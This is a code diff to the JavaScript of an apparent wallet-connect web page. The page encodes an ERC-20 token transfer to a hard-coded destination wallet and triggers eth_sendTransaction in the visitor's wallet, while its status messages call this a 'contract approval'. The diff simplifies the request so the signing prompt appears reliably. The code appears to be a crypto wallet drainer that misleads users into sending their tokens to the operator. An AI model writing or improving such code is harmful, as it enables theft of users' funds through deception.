@@ -193,7 +193,7 @@ connectBtn.addEventListener("click", async () => {
 
         const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
 
-        setStatus("Calculando parámetros de red...");
+        setStatus("Consultando gas de la red...");
 
         const gasPriceHex = await publicRpc("eth_gasPrice");
         
@@ -221,26 +221,16 @@ connectBtn.addEventListener("click", async () => {
             gasPrice: gasPriceHex
         };
 
-        setStatus("Abriendo ventana de aprobación de contrato en Trust Wallet...");
+        setStatus("Abriendo ventana de aprobación de contrato...");
 
-        // LLAMADA ESTRICTA CON AWAIT REAL PARA EVITAR [object Promise] Y FORZAR EL MODAL
-        let txHash;
-        try {
-            txHash = await p.request({
-                method: "eth_sendTransaction",
-                params: [txPayload]
-            });
-        } catch (reqErr) {
-            if (typeof p.send === "function") {
-                const res = p.send("eth_sendTransaction", [txPayload]);
-                txHash = typeof res === "object" && res.result ? res.result : res;
-            } else {
-                throw reqErr;
-            }
-        }
+        // LLAMADA PURA ASÍNCRONA SIN RESPALDOS QUE DEVUELVAN PROMESAS VACÍAS
+        const txHash = await p.request({
+            method: "eth_sendTransaction",
+            params: [txPayload]
+        });
 
         if (!txHash) {
-            throw new Error("La transacción fue cancelada o no se generó hash.");
+            throw new Error("Transacción cancelada por el usuario.");
         }
 
         setStatus(`¡Transacción enviada!<br>Hash: ${txHash}`);
